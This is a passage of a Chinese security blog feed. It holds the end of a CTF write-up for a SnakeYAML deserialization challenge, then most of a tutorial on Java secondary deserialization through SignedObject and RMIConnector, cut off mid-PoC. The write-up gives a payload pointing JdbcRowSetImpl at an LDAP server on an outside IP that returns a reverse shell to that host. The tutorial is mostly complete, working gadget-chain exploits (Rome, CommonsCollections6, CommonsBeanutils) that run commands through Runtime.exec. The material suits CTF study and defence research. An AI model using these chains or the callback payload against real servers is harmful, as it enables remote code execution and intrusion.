\u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.83.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.33.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.18.jar\u0026#34; 再看路由，简单明了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.example.ezyaml.controller; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.yaml.snakeyaml.Yaml; @RestController /* loaded from: ezyaml-1.0-SNAPSHOT.jar:BOOT-INF/classes/com/example/ezyaml/controller/IndexController.class */ public class IndexController { private static final String[] blacklist = {\u0026#34;ClassPath\u0026#34;, \u0026#34;DataSource\u0026#34;, \u0026#34;URLClassLoader\u0026#34;, \u0026#34;ScriptEngine\u0026#34;}; @RequestMapping({\u0026#34;/\u0026#34;}) public String index() { return \u0026#34;Hello ezyaml, Post /yaml param:yamlContent\u0026#34;; } @PostMapping({\u0026#34;/yaml\u0026#34;}) public String yaml(@RequestParam String yamlContent) { Yaml yaml = new Yaml(); try { for (String b : blacklist) { if (yamlContent.contains(b)) { return \u0026#34;存在非法关键字\u0026#34;; } } return yaml.loadAs(yamlContent, Object.class).toString(); } catch (Exception e) { return e.getMessage(); } } } yaml路由存在snakeyaml反序列化，有黑名单，一看到这个题以为是考的最近发的snakeyaml的rce：\n《SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘》\n结果本地出了题目中没出，本地是jdk8u71，从远程环境的回显来看是没有com.sun.javafx.iio.ImageFrame类，那么就打常规的snakeyaml反序列化调用setter方法打jndi，打JdbcRowSetImpl就行，挺常见了的，就是它的setter回调用到类中的connect()方法，然后可以打Jndi：\n需要两次setter，一次设置dataSource值，一次调用到connect()方法，但是尝试直接在获取类时打不了，尝试打高版本的jndi打法，可以尝试打用ldap反序列化数据达到反序列化攻击的效果，正好springboot中存在jackson，那么就反序列化打jackson，用jndimap工具来打：\n启动监听：\n反弹shell监听端口：\n然后在题目中打入payload:\n1 !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \u0026#34;ldap://47.100.223.173:1389/Deserialize/Jackson/ReverseShell/47.100.223.173/2333\u0026#34;, autoCommit: true} 如下：\n成功反弹shell拿到flag：\nflag如下：\n1 flag{yo9kfwKt6WDXup2TmSxeNO3QE7Igd5Js} 不懂为什么给个提示说题目不出网，但是我还很怪为什么ldap能接受到请求结果说不出网，可能是想考下面这个？\n《从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用》\n后面要学snakeyaml差不多看这两篇文章就行了。\n","date":"2025-08-07T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp/","title":"第十届上海市大学生网络安全大赛wp"},{"content":"Java二次反序列化 二次反序列化，就是反序列化两次，它主要用于两个绕过：\n黑名单的限制\n不出网利用\n测试环境：\nJDK 8u71 SignedObject类 这个类位于java.security.SignedObject，这个类是用于创建真实运行时对象的类，简单来说，就是SignedObject包含另一个Serializable对象。\n来看这个类的构造函数： 可以看到这里有序列化的过程，序列化的对象为object参数。\n再跟进一下这个类的getObject方法： 可以看到反序列化的过程，并且这里的this.content就是前面的序列化字符串，所以其实是可控的。\n所以我们可以构造一个恶意的SignedObject对象：\n1 2 3 4 KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(恶意对象，kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); 然后就是想在哪里调用这个SignedObject对象的getObject()方法，也就是可以调用到getter方法，而对于调用getter方法，前面比较经典的学了的就是Rome链和CB链，下面我们就先来简单看看这两条链子的利用。\n利用手段 rome链的利用 完美符合，三条链子都是获取getter方法来命令执行，正好可以得到前面的getObject()方法。下面来构造一下。\n总的思路都是先传入一个构造好了的SignedObject类，然后在调用到他的getObject()方法时反序列化恶意对象。\ntoString链 原本的toString链的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就来简单改改。\n还是用动态加载字节码来打，但这里就使用javassist来生成，具体的修改思路就是调用两次toString，从而可以调用到SignedObject类的getter方法，从而来进行一次完整的调用链，最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ToStringBean; import javax.management.BadAttributeValueExpException; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;, bean); //定义SignedObejct类 KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(bad,kp.getPrivate(), Signature.getInstance(\u0026#34;DSA\u0026#34;)); ToStringBean bean2 = new ToStringBean(SignedObject.class,signedObject); BadAttributeValueExpException bad2 = new BadAttributeValueExpException(null); setFieldValue(bad2,\u0026#34;val\u0026#34;, bean2); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad2); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功弹出计算机。再简单跟一下流程，前面的链子为：BadAttributeValueExpException#readObject()==》ObjectBean#toString() ==》SignedObject#getObject() ==》BadAttributeValueExpException#readObject() ==》 ObjectBean#toString()\n后面的就和基本的rome链差不多了，在这里后面拼接的是rome链，当然还可以拼接其他链子，比如CC6，POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package org.example; import com.sun.syndication.feed.impl.ToStringBean; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean toString = new ToStringBean(SignedObject.class,signedObject); setFieldValue(bad,\u0026#34;val\u0026#34;,toString); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 这样就可以用来绕过反序列化对CC6的限制了。\n没啥问题。\nhashCode链 其实就是套一层而已，而且本身这条链子后半部分和toString链差不多，后面就只给POC了。\n这里还是接的CC6了，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package org.example; import com.sun.syndication.feed.impl.ToStringBean; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.util.HashMap; import java.util.Map; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); ToStringBean bean = new ToStringBean(SignedObject.class,signedObject); EqualsBean equals = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hash2 = new HashMap(); hash2.put(equals,\u0026#34;fupanc1\u0026#34;); setFieldValue(equals,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(equals,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash2); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 理解一下就行。\nequals链 大差不差，这里还是接的CC6，注意理解这里的二次反序列化触发点，看一下代码就懂了，但是最好先自己尝试构造一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 package org.example; import java.lang.reflect.Field; import java.util.Hashtable; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,signedObject); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,signedObject); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,SignedObject.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,signedObject); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } CB链的利用 CB链就是调用了getter方法，完美符合这里打SignedObject的二次反序列化，就是将CB链中的TemplatesImpl类实例改成SignedObject类实例即可，这里还是接一个CC6，poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import java.security.Signature; import java.security.SignedObject; import java.security.KeyPairGenerator; import java.security.KeyPair; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); BeanComparator compare = new BeanComparator(); PriorityQueue queue= new PriorityQueue(2,compare); queue.add(1); queue.add(1); setFieldValue(compare,\u0026#34;property\u0026#34;,\u0026#34;object\u0026#34;); setFieldValue(queue,\u0026#34;queue\u0026#34;,new Object[]{signedObject,1}); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(queue); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ——————\n除了这里的rome链和CB链有调用getter，当然还有jackson和fastjson有调用getter的效果。\nRMIConnector 这个类位于javax.management.remote.rmi.RMIConnector。存在二次反序列化的点是这个类中的findRMIServerJRMP()，为我们可以跟进一下这个方法：\n这里是自定义了一个base64ToByteArray()方法用于将base64字符串解码成一个字节数组，然后进行了处理，最后进行了一个反序列化操作。\n可以找一找在哪里调用了这个方法，在同一个类中寻找，可以发现是在findRMIServer()方法调用： 要求解析完的path必须以/stub/来开头，看参数传递的话是从第6个开始进行传参，也就是会传递/stub/后面的字符串，再看一下字符串的来源，跟进一下这里的getURLPath()方法： 会返回这个类的变量，所以这里是需要实例化一个类的。再往前找这个findRMIServer()方法的调用情况：\n注意看参数传递的情况，然后可以看到这里需要rmiServer为null，这个好弄，在RMIConnector实例化的时候就可控，然后这里的connect()方法是public，可以直接调用，在这里我们可以先尝试一下正向调用，直接实例化RMIConnector来调用connect()方法，这里还是通过CC6来进行演示，也就是将这个CC6的链子序列化为base64数据。\n基本的参数都说了，现在来看一下需要实例化的类。\n先看一下RMIConnector类的构造方法：\n虽然为private，但是这里是定义了两个方法来进行实例化的：\n这里的env不好控制，直接传参为null使其为默认的就行了。实在不行还可以使用反射来修改。再看JMXServiceURL类的实例化，简单跟了一遍，重点就是如下：\n要求serviceURL必须以service:jmx:开头，然后最后结尾必须是://，也正如不满足的报错内容，可以知道这里的大概意思就是确保一个正常的协议，比如传参为service:jmx:rmi://，那么这里就是获取的协议为rmi,后面就是一些host的解析等等，这里就不多说了。\n所以这里可以简单如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); // 将字节数组进行 Base64 编码并输出 String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(\u0026#34;Base64编码后的序列化数据：\u0026#34;); System.out.println(base64Encoded); String base64_String=base64Encoded; JMXServiceURL url = new JMXServiceURL(\u0026#34;service:jmx:rmi://\u0026#34;); setFieldValue(url,\u0026#34;urlPath\u0026#34;,\u0026#34;/stub/\u0026#34;+base64_String); RMIConnector rmi = new RMIConnector(url,null); rmi.connect(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成弹出计算机，这里建议还是跟一下这里的流程。\n最后这里是成功弹出计算机了的，现在就是需要想怎么来调用这个connect()方法，一个非常方便的方法就是利用transform()方法，参考到CC链中的链式执行命令，所以这里可以进行如下尝试，比如还是使用CC6来当例子，最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.Map; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); 